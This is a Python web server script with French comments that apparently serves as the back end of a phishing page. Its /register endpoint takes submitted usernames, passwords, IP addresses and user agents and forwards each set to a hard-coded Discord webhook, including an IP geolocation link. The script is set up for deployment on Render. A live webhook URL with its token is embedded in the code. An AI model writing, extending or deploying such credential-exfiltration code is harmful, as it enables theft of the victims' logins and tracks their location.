import os
import json
import datetime
import urllib.request
from http.server import HTTPServer, SimpleHTTPRequestHandler

WEBHOOK_URL = "https://discord.com/api/webhooks/1536029607050870957/v2lW072iaQP_hprGmBLGJ2U_FrmrVWd-4zum6_KeiL8rZ1fBquBZYQvozIlS0HA3eva0"

class MyHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/register':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            # Affichage dans la console
            print("[+] Nouvelles données reçues :", data)

            # Horodatage de la réception
            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # Envoi vers Discord (indentation corrigée)
            msg = (
                f"--- NOUVELLE CONNEXION [{now}] ---\n"
                f"Utilisateur : {data.get('username')}\n"
                f"Mot de passe : {data.get('password')}\n"
                f"Adresse IP : {data.get('ip')}\n"
                f"Localisation IP : https://ip-api.com/#{data.get('ip')}\n"
                f"User-Agent : {data.get('userAgent')}"
            )

            payload = json.dumps({"content": msg}).encode('utf-8')
            req = urllib.request.Request(
                WEBHOOK_URL, 
                data=payload, 
                headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
            )
            
            try:
                urllib.request.urlopen(req)
            except Exception as e:
                print("Erreur envoi Discord :", e)

            # Réponse JSON envoyée au navigateur
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
        else:
            self.send_error(404, "Page non trouvée")

# Lancement du serveur (port dynamique pour Render)
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    server_address = ('', port)
    httpd = HTTPServer(server_address, MyHandler)
    print(f"Serveur lancé avec succès sur le port {port}...")
    httpd.serve_forever()
